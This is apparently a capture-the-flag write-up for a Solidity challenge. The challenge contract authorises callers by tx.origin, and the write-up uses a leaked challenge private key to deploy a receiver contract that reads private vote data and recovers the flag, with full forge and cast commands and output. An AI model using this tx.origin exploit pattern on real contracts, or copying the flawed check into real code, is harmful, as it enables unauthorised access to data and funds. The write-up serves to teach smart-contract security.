---
layout: writeup
title: Chains of Power
tags: Blockchain
---

## Description

The early voting systems are now live, and each candidate has been given access to a blockchain-based system that streams real-time results - but only to their own private dashboards.

Unfortunately, one careless candidate has leaked their private key. Can you exploit this mistake to impersonate them and retrieve the current vote tally?

Access the election results. Uncover the truth.

http://redac.ted:8888/


The linked page had a full brief of the challenge:

```text
🗳 Chains of Power
📜 Challenge Brief

This blockchain has been set up to allow our five candidates to view the current vote tally as votes come in.

However, one of the candidates has accidentally leaked their private key! Your job is to use this key to impersonate the candidate and recover the current voting results.

Please note that the blockchain is automatically reset every 30min to prevent spoilers and replenish gas.
📄 Challenge Info

Leaked Private Key: 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a
VotingChallenge Contract Address: 0x5FbDB2315678afecb367f032d93F642f64180aa3

💻 Smart Contract Source
VotingChallenge.sol

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface Receivable {
    function receiveDetails(string memory data) external;
}

contract VotingChallenge {
    mapping(address => bool) public isCandidate;
    string private voteDetails;

    constructor(address[5] memory candidates, string memory _voteDetails) {
        voteDetails = _voteDetails;
        for (uint i = 0; i < 5; i++) {
            isCandidate[candidates[i]] = true;
        }
    }

    function viewVotes() public {
        require(isCandidate[tx.origin], "Not a candidate");

        (bool ok, ) = msg.sender.call(
            abi.encodeWithSelector(
                Receivable.receiveDetails.selector,
                voteDetails
            )
        );

        require(ok, "Call to receiveDetails() failed");
    }
}

🔗 RPC Endpoint

The RPC endpoint for interacting with the blockchain is:

http://re.da.ct.ed:8545

You can use this RPC endpoint with tools like cast, ethers.js, or web3.py
📚 Helpful Resources

    Foundry Book (cast, forge)
    ethers.js Docs
    Web3.py Docs

```



## Solution

So we get the private key, the contract address, the source code, and the RPC endpoint.

In the contract, the `VotingChallenge.viewVotes` method checks if the user is authorised, and then it calls a function on the contract called `Receivable.receiveDetails`

So we need to create a contract that has a function `Receivable.receiveDetails` that when called stores the data passed to it, and we need another function that we can call that returns said data.

Here is the contract I ended up creating:

```sol
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// Declare the interface *before* using it
interface Receivable {
    function receiveDetails(string memory data) external;
}

interface VotingChallenge {
    function viewVotes() external;
}

contract Receiver is Receivable {
    event GotDetails(string data);

    function receiveDetails(string memory data) external override {
        emit GotDetails(data);
    }

    function callViewVotes(address votingContract) public {
        VotingChallenge(votingContract).viewVotes();
    }
}
```

I saved the contract as `Receiver.sol`

And then I gave the contract to the RPC

```bash
$ forge create Reciever.sol:Receiver \
  --rpc-url http://re.da.ct.ed:8545 \
  --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --broadcast
[⠊] Compiling...
No files changed, compilation skipped
Deployer: 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
Deployed to: 0x663F3ad617193148711d28f5334eE4Ed07016602
Transaction hash: 0x8cc7c5c08c72c87ca54adb431c99fa20c52845bfc13a833c990fbc5f100cf11d
```

The next step is to get our contract to call the challenge's contract

```bash
$ cast send 0x663F3ad617193148711d28f5334eE4Ed07016602 \
  "callViewVotes(address)" 0x5FbDB2315678afecb367f032d93F642f64180aa3 \
  --rpc-url http://re.da.ct.ed:8545 \
  --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a

blockHash            0x0490cb7b6baa11d19ce3ed5086fe5ff1235f78182b2558f12d3dfcf5b9220199
blockNumber          3
contractAddress
cumulativeGasUsed    47695
effectiveGasPrice    9
from                 0x3C44CdDdB6a900fa2b585dd299e03d12FA4293BC
gasUsed              47695
logs                 [{"address":"0x663f3ad617193148711d28f5334ee4ed07016602","topics":["0x0d7912e9116ee1e75df2422bacf6022926d8ede71ea9f2de6f1dc08361a899cd"],"data":"0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000ba2d2d2043555252454e5420564f544520434f554e5453202d2d0a436f6d7261646520456c69726120566f7373202d2032390a44722e204d61726375732044656c616e65202d2031310a416c79737361204368656e202d2033370a476f7665726e6f722048656e72696b20537461686c202d207365636564757b495f63406e5f723361645f265f6433706c4f795f73306c69643174595f63306e745261435433217d0a436f6d6d616e6465722052686561204b61656c202d203232000000000000","blockHash":"0x0490cb7b6baa11d19ce3ed5086fe5ff1235f78182b2558f12d3dfcf5b9220199","blockNumber":"0x3","blockTimestamp":"0x686fb2b1","transactionHash":"0xd4e92a7c65fa65ac76b3bc6d10736bf040e4c1f090bc34ece7bb16b234faa906","transactionIndex":"0x0","logIndex":"0x0","removed":false}]
logsBloom            0x00000000000000000000000000000000000000004000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000008000001000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
root
status               1 (success)
transactionHash      0xd4e92a7c65fa65ac76b3bc6d10736bf040e4c1f090bc34ece7bb16b234faa906
transactionIndex     0
type                 2
blobGasPrice         1
blobGasUsed
to                   0x663F3ad617193148711d28f5334eE4Ed07016602
```

I then as my `Receiver.receiveDetails` ends up emitting the details, I checked the logs

```bash
$ cast logs --address 0x663F3ad617193148711d28f5334eE4Ed07016602 --rpc-url http://re.da.ct.ed:8545
- address: 0x663F3ad617193148711d28f5334eE4Ed07016602
  blockHash: 0x0490cb7b6baa11d19ce3ed5086fe5ff1235f78182b2558f12d3dfcf5b9220199
  blockNumber: 3
  data: 0x000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000ba2d2d2043555252454e5420564f544520434f554e5453202d2d0a436f6d7261646520456c69726120566f7373202d2032390a44722e204d61726375732044656c616e65202d2031310a416c79737361204368656e202d2033370a476f7665726e6f722048656e72696b20537461686c202d207365636564757b495f63406e5f723361645f265f6433706c4f795f73306c69643174595f63306e745261435433217d0a436f6d6d616e6465722052686561204b61656c202d203232000000000000
  logIndex: 0
  removed: false
  topics: [
        0x0d7912e9116ee1e75df2422bacf6022926d8ede71ea9f2de6f1dc08361a899cd
  ]
  transactionHash: 0xd4e92a7c65fa65ac76b3bc6d10736bf040e4c1f090bc34ece7bb16b234faa906
  transactionIndex: 0
```

That gets us the data that was sent, which appears to be hex encrypted, so lets decrypt that:

```bash
$ echo "2d2d2043555252454e5420564f544520434f554e5453202d2d0a436f6d7261646520456c69726120566f7373202d2032390a44722e204d61726375732044656c616e65202d2031310a416c79737361204368656e202d2033370a476f7665726e6f722048656e72696b20537461686c202d207365636564757b495f63406e5f723361645f265f6433706c4f795f73306c69643174595f63306e745261435433217d0a436f6d6d616e6465722052686561204b61656c202d203232" | xxd -r -p
-- CURRENT VOTE COUNTS --
Comrade Elira Voss - 29
Dr. Marcus Delane - 11
Alyssa Chen - 37
Governor Henrik Stahl - secedu{I_c@n_r3ad_&_d3plOy_s0lid1tY_c0ntRaCT3!}
Commander Rhea Kael - 22
```

And there is the flag in the vote count for `Governer Henrik Stahl`

```flag
secedu{I_c@n_r3ad_&_d3plOy_s0lid1tY_c0ntRaCT3!}
```
